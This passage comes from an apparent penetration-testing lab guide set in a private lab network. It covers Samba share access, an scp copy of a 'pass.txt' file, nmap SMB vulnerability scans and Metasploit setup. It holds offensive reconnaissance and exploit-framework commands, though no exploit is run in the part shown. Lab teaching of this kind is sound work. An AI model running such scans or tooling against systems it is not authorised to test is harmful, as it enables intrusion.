10. read only = no
    
11. **Access Shared Folder on Windows**:
    

- Open **Run** and type: \\192.168.56.102\share.
    

**SCP File Transfer**: Transfer a file using SCP:

scp pass.txt kali@192.168.56.102:/home/kali/share

### **Exploit Framework**

#### _**1. Network Scanning with Nmap**_

**Basic Scan**:

nmap -n -A -p445 192.168.56.103

**SMB Vulnerability Scan**:

nmap -n -sV -p445 --script smb-vuln-* 192.168.56.103

#### _**2. Metasploit Framework Setup**_

**Initial Setup**:

1. Navigate to Metasploit directory:
    
2. cd /usr/share/metasploit-framework
    
3. Start PostgreSQL and initialize the database:
    
4. sudo systemctl enable postgresql
    
5. sudo systemctl start postgresql
    
6. sudo msfdb init
    
7. Launch Metasploit Console:
    
8. msfconsole
    

**Useful Commands**:

- **Check Database Status**: msf6 > db_status
    
- **Show Available Exploits**: msf6 > show exploits